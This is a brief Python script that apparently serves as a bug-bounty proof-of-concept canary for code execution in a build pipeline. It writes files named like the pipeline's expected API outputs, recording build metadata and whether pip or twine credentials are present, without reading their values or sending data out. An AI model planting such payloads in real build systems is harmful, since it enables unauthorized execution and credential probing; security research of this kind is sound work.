from __future__ import annotations

import hashlib
import json
import os
import sys
import uuid
from pathlib import Path


def main() -> int:
    args = sys.argv[1:]

    if "--dest-dir" not in args:
        raise SystemExit("expected --dest-dir")

    dest_index = args.index("--dest-dir") + 1
    if dest_index >= len(args):
        raise SystemExit("missing --dest-dir value")

    destination = Path(args[dest_index]).resolve()
    destination.mkdir(parents=True, exist_ok=True)

    marker = f"MSOBB-ARH-RCE-{uuid.uuid4()}"

    evidence = {
        "marker": marker,
        "executed_module": str(Path(__file__).resolve()),
        "build_id": os.getenv("BUILD_BUILDID"),
        "build_repository": os.getenv("BUILD_REPOSITORY_NAME"),
        "agent_name": os.getenv("AGENT_NAME"),
        "dev_feed_name": os.getenv("DEVFEEDNAME"),
        "pip_auth_present": bool(
            os.getenv("PIP_INDEX_URL") or os.getenv("PIP_EXTRA_INDEX_URL")
        ),
        "twine_auth_present": bool(os.getenv("PYPIRC_PATH")),
    }

    evidence_json = json.dumps(evidence, indent=2, sort_keys=True)

    (destination / "api.md").write_text(
        "# API Review Hub execution canary\n\n"
        "```json\n"
        f"{evidence_json}\n"
        "```\n",
        encoding="utf-8",
    )

    (destination / "api.metadata.yml").write_text(
        "apiHash: "
        f"{hashlib.sha256(marker.encode()).hexdigest()}\n"
        "packageVersion: 0.0.0-msobb\n",
        encoding="utf-8",
    )

    print(evidence_json)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
